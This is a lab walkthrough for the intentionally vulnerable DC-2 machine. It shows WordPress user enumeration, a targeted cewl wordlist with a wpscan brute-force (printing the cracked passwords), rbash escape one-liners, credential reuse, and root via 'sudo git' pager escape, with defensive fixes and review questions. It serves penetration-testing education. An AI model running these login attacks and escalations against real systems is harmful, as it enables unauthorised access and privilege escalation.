## Why this machine is here

Because it is the box that **breaks the `rockyou.txt` habit**. Every beginner's
instinct is to point a 14-million-line wordlist at a login form and wait. Here that
will not work in any reasonable time: the passwords are drawn from the site's own
themed content, so the only practical list is one **you build from the target**.

That single idea — *the wordlist should come from the target* — is worth more than
any tool in this path.

It also gives you two techniques you will use for the rest of your career:
**`cewl`** for targeted wordlists, and **escaping a restricted shell**, plus your
first `sudo` GTFOBins escalation.

## Learning objectives

1. Set up a **hostname** the application requires (`dc-2` in `/etc/hosts`).
2. Enumerate WordPress properly with **`wpscan`** — users, then password attempts
   against a *custom* list.
3. Understand **why default wordlists fail** and how to fix that.
4. Build a targeted wordlist with **`cewl`** and tune `-d`, `-m`, `--with-numbers`, `-e`.
5. Find a service on a **non-standard port** and remember to use `-p`.
6. **Escape `rbash`** — three different ways — and understand what it actually
   restricts.
7. **Pivot between users** with `su` using a reused password.
8. Read `sudo -l` output precisely, including `NOPASSWD:`, and escalate via
   **GTFOBins**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Username enumeration | WordPress `?author=` → `admin`, `tom`, `jerry` |
| **Targeted wordlist attack** | `cewl` against `http://dc-2/`, then `wpscan --passwords` |
| Credential reuse across services | WordPress password → **SSH** as `tom` |
| Credential reuse across users | `tom` → `jerry` via `su` |
| **Restricted shell escape** | `rbash` → `vi` → `:set shell=/bin/bash` → `:shell` |
| Non-standard port | SSH on **7744**, not 22 |
| **Over-privileged sudo rule** | `(root) NOPASSWD: /usr/bin/git` |

2. Flag 1's text ends with something like *"just need to cewl more?"* — that is a

5. One of the WordPress passwords also works for **SSH on port 7744**.

<details>
<summary><strong>Rung 3 — the restricted shell</strong></summary>

`ssh tom@TARGET -p 7744` lands you in **`rbash`**: no `cd`, no `/` in commands, no
redirects, `PATH` pinned. `whoami` may not even exist.

Confirm it: `echo $0`, `set -o | grep restricted`, `echo $PATH`.

Escapes to try, in order:

```bash
bash --noprofile --norc          # clean unrestricted bash
vi                               # then :set shell=/bin/bash  and  :shell
vi -c ':!/bin/bash' /dev/null
find . -exec /bin/bash \; -quit
python3 -c 'import os;os.system("/bin/bash")'
```

Once out, `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
so ordinary commands resolve again. Flag 3 is in `/home/tom/`.
</details>

<details>
<summary><strong>Rung 4 — pivoting and escalating</strong></summary>

**Pivot:** `tom`'s password also works for **`jerry`** — `su jerry`. Flag 4 is in
`/home/jerry/`.

**Escalate:** as `jerry`, run `sudo -l`:

```text
User jerry may run the following commands on dc-2:
    (root) NOPASSWD: /usr/bin/git
```

Look `git` up on GTFOBins. The pager escape is the clean one:

```bash
sudo git -p help config        # opens 'less' as root; then type  !/bin/sh
# or
sudo git help config           # same
```

Flag 5 is `/root/flag5.txt`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `/etc/hosts` → `dc-2`; browse `http://dc-2/`.
2. `nmap -p-` → **80** (WordPress) and **7744** (OpenSSH 6.7p1). Port 22 is closed.
3. **Flag 1** on the site → *"cewl more"* → build `dc2-passwords.txt` with
   `cewl -w dc2-passwords.txt -d 2 -m 5 http://dc-2/`.
4. `wpscan --url http://dc-2/ -e u` → `admin`, `tom`, `jerry`; then
   `-P dc2-passwords.txt` cracks **`tom`** and **`jerry`**'s WordPress passwords.
5. **Flag 2** → try those credentials on **SSH port 7744** → `tom` logs in →
   **`rbash`**.
6. Escape `rbash` with `vi` (`:set shell=/bin/bash`, `:shell`) and fix `PATH` →
   **flag 3** in `/home/tom/`.
7. **Reuse across users:** `su jerry` with the same password → **flag 4** in
   `/home/jerry/`.
8. `sudo -l` → `(root) NOPASSWD: /usr/bin/git` → `sudo git -p help config` →
   `!/bin/sh` in the pager → **root** → **flag 5** `/root/flag5.txt`.
</details>

## After you finish — review questions

1. How many words did your `cewl` list contain, and how does that compare to
   `rockyou`? Why did the *smaller* list win?
2. What would you add to your `cewl` list before a real engagement — names, dates,
   product names, the company's own jargon? Which tool builds those?
3. Exactly what does `rbash` restrict, and what is the *conceptual* weakness in
   using a restricted shell as a security boundary?
4. Why is `bash --noprofile` sometimes enough to defeat a "restricted" shell with no
   cleverness at all? What does that tell you about how the restriction was
   implemented?
5. `git` is a version-control tool. Explain precisely why granting it with
   `NOPASSWD` is equivalent to granting root.
6. Both `tom` and `jerry` shared a password. What single control would have stopped
   the whole chain at that point?
7. Would `wpscan` against `xmlrpc.php` have been faster? What are the trade-offs?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| WordPress user enumeration (`?author=`) | Block `/?author=` at the WAF or via rewrite rule; it leaks the user list for free |
| Site content used as a password source | Passwords must not be derivable from public content. Enforce length + a breached-password check |
| `rockyou` fails but `cewl` succeeds | This is the point: **defend against targeted lists**, not just common ones |
| WordPress password reused for SSH | Unique credentials per service; consider disabling SSH password auth entirely (keys only) |
| `tom`'s password reused by `jerry` | Enforce per-account uniqueness; alert on shared credentials |
| **`rbash` as a security boundary** | Do not rely on it. Use `sudo` with explicit commands, or a locked-down service account with **no shell at all** (`/usr/sbin/nologin`) |
| SSH on a non-standard port | Port obscurity is not a control. Key-based auth + `fail2ban` + no password auth is |
| `(root) NOPASSWD: /usr/bin/git` | Never grant `NOPASSWD` on a general-purpose tool. Grant the *specific* subcommand, or use a purpose-built script |

**The single biggest lesson:** *a restricted shell is a convenience, not a
boundary.* It restricts one process; anything that process can spawn is unrestricted.

## The commands, annotated — every input and every output

This box requires the hostname **`dc-2`** before anything works. Do that first.

### 1. Hostname, then scan

```bash
echo "TARGET dc-2" | sudo tee -a /etc/hosts
sudo nmap -sC -sV -p- -T4 -oA scans/dc2 TARGET
```

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-title: DC-2 &#8211; Just another WordPress site
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
Service Info: OS: Linux
```

**Port 22 is not in the list.** `-p-` is what found `7744`; the default top-1,000 scan
would have missed it, and you would have concluded there was no SSH. A service moved off its
standard port is *obscurity*, not a control — but it does defeat a lazy scan.

### 2. Flag 1 is an instruction

```bash
curl -s http://dc-2/ | grep -oiE 'flag[^<]*|cewl[^<]*'
```
```text
flag1.txt:
Just want to say hello to all the DC-2 fans.
Your flag is: 4d3 i5 n0t ju5t 4 w0rd1n6, 1f y0u c4n r34d 1t, y0u c4n u53 1t.
Just need to cewl more? ...
```

*"Just need to cewl more?"* is the author telling you which tool to use. The point of the box
is that **the passwords are drawn from the site's own content**, so a generic list cannot
find them.

### 3. Enumerate users

```bash
wpscan --url http://dc-2/ -e u
```
```text
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Wp Json Api (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] jerry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

`Author Id Brute Forcing - Author Pattern` means wpscan requested `/?author=1`, `/?author=2`,
… and read the redirect to the author archive. **That is the enumeration oracle** — three
usernames for free, and the reason a defender blocks `/?author=`.

### 4. Build the list from the target

```bash
cewl -w dc2-passwords.txt -d 2 -m 5 http://dc-2/
wc -l dc2-passwords.txt
sort -u -o dc2-passwords.txt dc2-passwords.txt
wc -l dc2-passwords.txt
```
```text
CeWL 6.1 (Maximising Word Usage) Robin Wood (robin@digi.ninja)
Writing to dc2-passwords.txt
1214 dc2-passwords.txt
  887 dc2-passwords.txt
```

`-d 2` crawls two hops deep; `-m 5` discards words shorter than five characters (the bulk of
the noise); `-w` writes the list. The two `wc -l` calls are the lesson: **1,214 raw lines
collapse to 887 unique**, and duplicates buy you nothing while costing time. `sort -u -o FILE
FILE` writes back safely — `sort -u FILE > FILE` **truncates the file before `sort` reads
it**, because the shell opens the output first, and leaves you with an empty list.

```bash
wpscan --url http://dc-2/ -U tom,jerry,admin -P dc2-passwords.txt
```
```text
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - tom / parturient
[SUCCESS] - jerry / adipiscing
[!] admin - No valid passwords found
```

`-U` supplies usernames, `-P` the password list. Note
`Performing password attack on Xmlrpc`: wpscan uses **`xmlrpc.php`**, which accepts many
password guesses in one HTTP request — far faster, and a finding in itself. Two of three
accounts fell to a 887-word list built from the site's own text. `rockyou.txt` would not have
found these in a reasonable time.

### 5. SSH on the odd port, into a restricted shell

```bash
ssh tom@dc-2 -p 7744
```
```text
tom@DC-2:~$ cd /tmp
-rbash: cd: restricted
tom@DC-2:~$ /bin/ls
-rbash: /bin/ls: restricted
tom@DC-2:~$ whoami
-rbash: whoami: command not found
```

Confirm what you are in rather than guessing:

```bash
echo $0; echo $SHELL; set -o | grep restricted; echo $PATH
```
```text
-rbash
/bin/rbash
restricted        on
/home/tom/usr/bin
```

`rbash` blocks `cd`, blocks setting `PATH`/`SHELL`/`ENV`, refuses any command containing a
**`/`**, and forbids output redirection. `echo $PATH` shows the pinned directory — here it
contains only a curated handful of commands.

### 6. Escape it

```bash
vi
# inside vi:  :set shell=/bin/bash   then   :shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
id
cat flag3.txt
```
```text
tom@DC-2:~$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
Good to see that you've made it this far.
But you're not home yet. You still need to get the final flag...
```

The escape mechanism matters more than the trick: **`rbash` restricts one process.** `vi` is
permitted, and `vi` can run `:set shell=/bin/bash` then `:shell` — spawning a *new*,
unrestricted shell. Anything the restricted shell can spawn is unrestricted.

`export PATH=…` is essential afterwards: you now have a real bash with a crippled `PATH`, so
`ls`, `id` and `sudo` all report `command not found`, which looks exactly like a failed
escape. Also try `bash --noprofile --norc` first — if the restriction is imposed by
`~/.bashrc` rather than by the binary, skipping the startup files defeats it with no
technique at all.

### 7. Pivot between users

```bash
su jerry
cat /home/jerry/flag4.txt
```
```text
Password:
jerry@DC-2:/home/tom$
Good to see that you've made it this far.
The final flag is in /root.
```

`tom`'s password also works for `jerry` — **credential reuse across accounts**. `su` needs a
real TTY, which is why the `rbash` escape had to come first: in a raw shell `su` fails with
`su: must be run from a terminal`.

### 8. `sudo -l` and the GTFOBins escape

```bash
sudo -l
```
```text
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

Read it as a contract: **`(root)`** = may run as root, **`NOPASSWD:`** = no password will be
requested, **`/usr/bin/git`** = the one permitted program. `secure_path` is present, so
`PATH` hijacking is unavailable — the escape has to come through `git` itself.

```bash
sudo git -p help config
# inside the pager:  !/bin/sh
id
cat /root/flag5.txt
```
```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

`-p` pipes the output through a **pager** (`less`). `less` supports `!CMD`, which runs `CMD`
via the shell — and because `less` was started by a root-owned `git` under `NOPASSWD`, that
shell is root. The author believed they granted permission to run *one program*; what they
granted was permission to run **anything that program can be made to do**. `sudo git help
config` works the same way.

**The general rule:** any interpreter, pager, editor, file-transfer tool, or program that can
shell out (`find -exec`, `tar`, `awk`, `zip`) is an escape hatch. That is what
[GTFOBins](https://gtfobins.github.io/) catalogues, and it is why `sudo -l` is the first
command you run on every box.
